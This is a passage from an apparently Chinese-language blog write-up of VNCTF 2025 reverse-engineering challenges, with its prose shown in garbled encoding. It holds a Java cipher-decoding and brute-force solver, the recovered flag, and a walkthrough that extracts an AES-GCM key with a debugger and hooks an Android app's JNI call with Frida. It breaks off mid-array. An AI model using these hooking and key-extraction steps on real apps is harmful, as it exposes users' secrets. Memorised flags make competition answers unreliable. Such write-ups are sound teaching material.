class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">()</span> &#123;</span><br><span class="line">        encode_map();</span><br><span class="line">        decode_map();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">encode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;Character, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&#x27;a&#x27;</span>, <span class="string">&quot;iiijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;b&#x27;</span>, <span class="string">&quot;jjjii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;c&#x27;</span>, <span class="string">&quot;jijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;d&#x27;</span>, <span class="string">&quot;jjijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;e&#x27;</span>, <span class="string">&quot;jjjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;f&#x27;</span>, <span class="string">&quot;ijjjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;g&#x27;</span>, <span class="string">&quot;jjjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;h&#x27;</span>, <span class="string">&quot;iijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;i&#x27;</span>, <span class="string">&quot;ijiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;j&#x27;</span>, <span class="string">&quot;iiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;k&#x27;</span>, <span class="string">&quot;jjjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;l&#x27;</span>, <span class="string">&quot;jijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;m&#x27;</span>, <span class="string">&quot;ijiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;n&#x27;</span>, <span class="string">&quot;iijji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;o&#x27;</span>, <span class="string">&quot;ijjij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;p&#x27;</span>, <span class="string">&quot;jiiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;q&#x27;</span>, <span class="string">&quot;ijijj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;r&#x27;</span>, <span class="string">&quot;jijii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;s&#x27;</span>, <span class="string">&quot;iiiii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;t&#x27;</span>, <span class="string">&quot;jjiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;u&#x27;</span>, <span class="string">&quot;ijjji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;v&#x27;</span>, <span class="string">&quot;jiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;w&#x27;</span>, <span class="string">&quot;iiiij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;x&#x27;</span>, <span class="string">&quot;iijij&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;y&#x27;</span>, <span class="string">&quot;jjiji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;z&#x27;</span>, <span class="string">&quot;jijjj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;1&#x27;</span>, <span class="string">&quot;iijjl&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;iiilj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;iliii&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;jiili&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jilji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;iliji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;jjjlj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;ijljj&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;iljji&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_ecode.put(<span class="string">&#x27;0&#x27;</span>, <span class="string">&quot;jjjli&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decode_map</span><span class="params">()</span> &#123;</span><br><span class="line">        HashMap&lt;String, Character&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode = hashMap;</span><br><span class="line">        hashMap.put(<span class="string">&quot;iiijj&quot;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjii&quot;</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijij&quot;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjijj&quot;</span>, <span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjjj&quot;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjjj&quot;</span>, <span class="string">&#x27;f&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjji&quot;</span>, <span class="string">&#x27;g&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijii&quot;</span>, <span class="string">&#x27;h&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiji&quot;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiji&quot;</span>, <span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjij&quot;</span>, <span class="string">&#x27;k&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijji&quot;</span>, <span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijiij&quot;</span>, <span class="string">&#x27;m&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijji&quot;</span>, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjij&quot;</span>, <span class="string">&#x27;o&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiji&quot;</span>, <span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijijj&quot;</span>, <span class="string">&#x27;q&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijii&quot;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiii&quot;</span>, <span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiij&quot;</span>, <span class="string">&#x27;t&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijjji&quot;</span>, <span class="string">&#x27;u&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiiij&quot;</span>, <span class="string">&#x27;v&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiiij&quot;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijij&quot;</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjiji&quot;</span>, <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jijjj&quot;</span>, <span class="string">&#x27;z&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iijjl&quot;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iiilj&quot;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliii&quot;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jiili&quot;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jilji&quot;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iliji&quot;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjlj&quot;</span>, <span class="string">&#x27;7&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;ijljj&quot;</span>, <span class="string">&#x27;8&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;iljji&quot;</span>, <span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">        <span class="built_in">this</span>.fish_dcode.put(<span class="string">&quot;jjjli&quot;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_ecode.get(Character.valueOf(str.charAt(i))));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i2 &lt; str.length() / <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> i + <span class="number">5</span>;</span><br><span class="line">            sb.append(<span class="built_in">this</span>.fish_dcode.get(str.substring(i, i3)));</span><br><span class="line">            i2++;</span><br><span class="line">            i = i3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] str1 = str.getBytes();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str1.length; i++) &#123;</span><br><span class="line">            str1[i] = (<span class="type">byte</span>) (str1[i] + <span class="number">68</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexStringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : str1) &#123;</span><br><span class="line">            hexStringBuilder.append(String.format(<span class="string">&quot;%02x&quot;</span>, Byte.valueOf(b)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> hexStringBuilder.toString();</span><br><span class="line">        <span class="type">char</span>[] str3 = str2.toCharArray();</span><br><span class="line">        codes(str3, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; str3.length; i2++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (str3[i2] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; str3[i2] &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">                str3[i2] = (<span class="type">char</span>) ((str3[i2] - <span class="string">&#x27;1&#x27;</span>) + (i2 % <span class="number">4</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                str3[i2] = (<span class="type">char</span>) (str3[i2] + <span class="string">&#x27;7&#x27;</span> + (i2 % <span class="number">10</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(str3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">codes</span><span class="params">(<span class="type">char</span>[] a, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= a.length - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a[index] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        a[index + <span class="number">1</span>] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        a[index] = (<span class="type">char</span>) (a[index] ^ a[index + <span class="number">1</span>]);</span><br><span class="line">        codes(a, index + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// è§£å¯†ä¸€å±‚</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">encflag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>().decode(<span class="string">&quot;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(encflag);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">candidates</span> <span class="operator">=</span> <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_!?.~&amp;*()_+=@#$%^&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">decrypted</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">currentIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// çˆ†ç ´</span></span><br><span class="line">        <span class="keyword">while</span> (currentIndex &lt; encflag.length())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">found</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// éå†å€™é€‰å­—ç¬¦</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : candidates.toCharArray())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// åŠ å¯†</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">encrypted</span> <span class="operator">=</span> encrypt(decrypted + String.valueOf(c));</span><br><span class="line"></span><br><span class="line">                <span class="comment">// åˆ¤æ–­åŠ å¯†åçš„åä¸¤ä¸ªå­—ç¬¦æ˜¯å¦ä¸ç›®æ ‡å­—ç¬¦ä¸²åŒ¹é…</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> encrypted.substring(currentIndex, currentIndex + <span class="number">2</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> encflag.substring(currentIndex, currentIndex + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (s1.equals(s2))</span><br><span class="line">                &#123;</span><br><span class="line">                    decrypted.append(c);</span><br><span class="line">                    currentIndex += <span class="number">2</span>;</span><br><span class="line">                    found = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¾“å‡ºè¿˜åŸçš„æ˜æ–‡</span></span><br><span class="line">        System.out.println(decrypted.toString());</span><br><span class="line">        <span class="comment">// VNCTF&#123;u_re4l1y_kn0w_H0Ok_my_f1Sh!1l&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h4><p><strong>VNCTF{u_re4l1y_kn0w_H0Ok_my_f1Sh!1l}</strong></p><h3 id="kotlindroid"><a href="#kotlindroid" class="headerlink" title="kotlindroid"></a>kotlindroid</h3><p>jadxåˆ†æå‘ç°æœ‰ä¸ªcheckå‡½æ•°ï¼Œè¿™ä¸ªBase64åŠ å¯†åçš„åº”è¯¥å°±æ˜¯Flagï¼Œç„¶åæŸ¥çœ‹äº¤å‰è°ƒç”¨æ‰¾åˆ°ä¸Šå±‚ã€‚</p><p><img src="/2025/02/12/VNCTF2025/kot1.png" alt="d0aed962ce69b047bd07052cc50206ac"></p><p>å‘ç°ä¸‹é¢è¿™è¾¹è°ƒç”¨äº†checkï¼Œä¼ è¿›æ¥äº†ä¸€ä¸ªkeyï¼Œç›´æ¥åŠ¨è°ƒæ–­ç‚¹è·å–ã€‚</p><p><img src="/2025/02/12/VNCTF2025/kot2.png" alt="img"></p><p>åœ¨è¿™è¾¹æ–­ç‚¹ï¼Œå³å¯çœ‹åˆ°ä¸¤ä¸ªmodifiedKeyæ•°ç»„ï¼Œåˆå¹¶èµ·æ¥å°±æ˜¯16å­—èŠ‚çš„Keyäº†ã€‚</p><p>{97,116,114,105,107,101,121,115,115,121,101,107,105,114,116,97}</p><p><img src="/2025/02/12/VNCTF2025/kot3.png" alt="cd8e014f2fe16b9a2a1bba1e2226049e"></p><p>ä½†æ˜¯è¿™è¾¹æ²¡çœ‹åˆ°å’Œbase64ç›¸å…³åŠ å¯†ï¼Œå…¨å±€æœç´¢base64åœ¨SearchActivityKt$sec$1ä¸­çš„invokeSuspendå‡½æ•°ä¸­çœ‹åˆ°ã€‚</p><p>è¿™è¾¹åº”è¯¥å°±æ˜¯é‚£è¾¹checkå‡½æ•°invokeåè·³è¿‡æ¥çš„ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯AES GCMåŠ å¯†ï¼ŒIVæ˜¯â€114514â€ï¼ŒKeyæ˜¯Checké‚£è¾¹æ–­ç‚¹æ‹¿åˆ°çš„ï¼ŒAADæ•°æ®æ²¡æ³•ç›´æ¥è·å–ï¼Œä½¿ç”¨frida hookæ‹¦æˆªJNI.INSTANCE.getAt()å‡½æ•°ã€‚</p><p><img src="/2025/02/12/VNCTF2025/kot4.png" alt="QQ_1739079484622"></p><p><img src="/2025/02/12/VNCTF2025/kot5.png" alt="QQ_1739079580281"></p><p>fridaä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">package_name = <span class="string">&quot;com.atri.ezcompose&quot;</span></span><br><span class="line"></span><br><span class="line">hook_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    try &#123;</span></span><br><span class="line"><span class="string">        var JNI = Java.use(&#x27;com.atri.ezcompose.JNI&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        var instance = JNI.INSTANCE.value;</span></span><br><span class="line"><span class="string">        console.log(&#x27;INSTANCE: &#x27; + instance);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        instance.getAt.implementation = function () &#123;</span></span><br><span class="line"><span class="string">            var result = this.getAt();</span></span><br><span class="line"><span class="string">            console.log(&quot;getAt result: &quot; + result);</span></span><br><span class="line"><span class="string">            return result;</span></span><br><span class="line"><span class="string">        &#125;;</span></span><br><span class="line"><span class="string">    &#125; catch (e) &#123;</span></span><br><span class="line"><span class="string">        console.log(&quot;Error: &quot; + e);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line">    session = device.attach(<span class="string">&quot;ezCompose&quot;</span>)</span><br><span class="line">    script = session.create_script(hook_script)</span><br><span class="line">    script.load()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># INSTANCE: com.atri.ezcompose.JNI@f264edc</span></span><br><span class="line"><span class="comment"># getAt result: mysecretadd</span></span><br></pre></td></tr></table></figure><p>æ‹¦æˆªåˆ°ADDæ•°æ®ä¸ºâ€mysecretaddâ€</p><p>å¯ä»¥ä»ä¸»åŠ å¯†æµç¨‹çœ‹åˆ°æœ€åBase64æ˜¯å°†IVåŠ ä¸Šè¢«åŠ å¯†æ•°æ®ååœ¨è¿›è¡Œç¼–ç ï¼Œæ‰€ä»¥å°†è¢«åŠ å¯†çš„Flagè¿›è¡ŒBase64è§£ç åå»æ‰å‰é¢çš„â€114514â€å°±æ˜¯åŸå¯†æ–‡ã€‚</p><p>ä½¿ç”¨javaè¿›è¡Œè§£å¯†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.GCMParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">IV</span> <span class="operator">=</span> <span class="string">&quot;114514&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] Key = &#123;<span class="number">97</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">107</span>,<span class="number">101</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">121</span>,<span class="number">101</span>,<span class="number">107</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">97</span>&#125;;</span><br><span class="line">        <span class="type">byte</span>[] AAdBytes = &#123;<span class="number">109</span>,<span class="number">121</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">100</span>,<span class="number">100</span>&#125;;</span><br><span class="line">        <span class="comment">// åŸå¯†æ–‡</span></span><br><span class="line">        <span class="type">int</span> [] Enc  = &#123;<span class="number">0x1c</span>,<span class="number">0xcb</span>,<span class="number">0x89</span>,<span class="number">0x28</span>,<span class="number">0xb3</span>,<span class="number">0x96</span>,<span class="number">0xd4</span>,<span class="number">0x1a</span>,<span class="number">0x82</span>,<span class="number">0x02</span>,<span class="number">0x2d</span>,<span class="number">0x8c</span>,<span class="number">0xc6</span>,<span class="number">0x91</span>,<span class="number">0xd8</span>,<span class="number">0x8c</span>,<span class="number">0x68</span>,<span class="number">0xe9</span>,<span class="number">0x3e</span>,<span class="number">0xaf</span>,<span class="number">0x36</span>,<span class="number">0x5d</span>,<span class="number">0x74</span>,<span class="number">0x3f</span>,<span class="number">0x8e</span>,<span class="number">0x0c</span>,<span class="number">0x79</span>,<span class="number">0x59</span>,<span class="number">0x8a</span>,<span class="number">0xd9</span>,<span class="number">0xd8</span>,<span class="number">0xc5</span>,<span class="number">0x79</span>,<span class="number">0xdd</span>,<span class="number">0xaf</span>,<span class="number">0x71</span>,<span class="number">0x8d</span>,<span class="number">0x05</span>,<span 